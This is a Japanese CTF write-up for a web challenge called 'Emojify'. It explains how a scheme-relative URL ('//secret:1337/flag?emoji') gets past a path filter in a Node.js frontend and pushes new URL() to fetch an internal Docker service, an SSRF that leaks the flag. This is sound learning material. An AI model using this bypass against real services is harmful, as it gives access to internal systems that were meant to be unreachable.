---
title: Emojify
category: web
genre: server-side
difficulty: medium
tags:
  - ssrf
  - url-parser
  - scheme-relative-url
  - docker-network
source: emojify/frontend/index.js
solved_at: 2026-05-29
---

# Emojify

## 問題の要点

frontend の `/api` は `path` を WAF に通してから、固定 base つきの `new URL()` で fetch する。

```js
if (!path.startsWith("/")) throw new Error("Invalid 1");
if (!path.includes("emoji")) throw new Error("Invalid 2");

const url = new URL(path, "http://backend:3000");
const emoji = await fetch(url).then((r) => r.text());
```

secret service は Docker 内の `http://secret:1337/flag`。

## 解き方

`new URL()` は `//host/path` を scheme-relative URL として解釈する。
つまり `path` が `/` で始まっていても host を差し替えられる。

payload:

```text
/api?path=//secret:1337/flag?emoji
```

`//secret:1337/flag?emoji` は `startsWith("/")` と `includes("emoji")` を満たし、
fetch 先は `http://secret:1337/flag?emoji` になる。
`/flag` は query を見ないため flag が返る。

## 連携する知見

- [Web](../../../insights/web.md)
- [Web relations](../../../relations/web.md)
